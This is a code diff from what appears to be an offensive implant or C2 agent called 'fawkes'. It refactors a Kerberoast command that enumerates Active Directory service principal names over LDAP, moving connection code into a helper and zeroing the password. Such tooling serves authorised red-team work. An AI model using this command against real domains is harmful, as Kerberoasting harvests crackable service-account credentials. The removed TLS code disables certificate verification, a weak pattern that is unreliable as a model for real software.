@@ -1,13 +1,10 @@
 package commands
 
 import (
-	"crypto/tls"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"net"
 	"strings"
-	"time"
 
 	"fawkes/pkg/structs"
 
@@ -43,6 +40,7 @@ func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
 		return errorf("Error parsing parameters: %v", err)
 	}
+	defer structs.ZeroString(&args.Password)
 
 	if args.Server == "" || args.Username == "" || args.Password == "" {
 		return errorResult("Error: server, username, and password are required. Username should be in UPN format (user@domain.local)")
@@ -180,23 +178,14 @@ func enumerateSPNs(args kerberoastArgs) ([]spnEntry, error) {
 		UseTLS:   args.UseTLS,
 	}
 
-	var conn *ldap.Conn
-	var err error
-	dialer := &net.Dialer{Timeout: 10 * time.Second}
-	if ldapArgs.UseTLS {
-		if ldapArgs.Port <= 0 {
+	if ldapArgs.Port <= 0 {
+		if ldapArgs.UseTLS {
 			ldapArgs.Port = 636
-		}
-		conn, err = ldap.DialURL(fmt.Sprintf("ldaps://%s:%d", ldapArgs.Server, ldapArgs.Port),
-			ldap.DialWithDialer(dialer),
-			ldap.DialWithTLSConfig(&tls.Config{InsecureSkipVerify: true}))
-	} else {
-		if ldapArgs.Port <= 0 {
+		} else {
 			ldapArgs.Port = 389
 		}
-		conn, err = ldap.DialURL(fmt.Sprintf("ldap://%s:%d", ldapArgs.Server, ldapArgs.Port),
-			ldap.DialWithDialer(dialer))
 	}
+	conn, err := ldapDial(ldapArgs.Server, ldapArgs.Port, ldapArgs.UseTLS)
 	if err != nil {
 		return nil, fmt.Errorf("LDAP connect: %v", err)
 	}
